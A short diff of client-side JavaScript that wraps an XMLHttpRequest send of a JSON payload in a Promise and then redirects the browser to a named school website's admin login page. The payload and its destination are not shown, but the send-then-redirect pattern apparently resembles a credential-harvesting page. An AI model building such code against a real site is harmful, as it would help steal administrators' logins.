@@ -372,9 +372,22 @@ dbg();
           }
         ]
       };
-      await request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
-            dbg(); //5
-            window.location.href = "https://www.zs-bezno.cz/admin/login";
+      await new Promise((resolve, reject) => {
+    request.onload = () => {
+        if (request.status >= 200 && request.status < 300) {
+            resolve(request.response);
+        } else {
+            reject(new Error(`HTTP ${request.status}`));
+        }
+    };
+
+    request.onerror = () => reject(new Error("Network error"));
+
+    request.send(JSON.stringify(Payload));
+});
+
+dbg(); // 5
+window.location.href = "https://www.zs-bezno.cz/admin/login";//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
 
     } else {
       console.error('status: ', data.status, ' message: ', data.message); //if error then dont explode
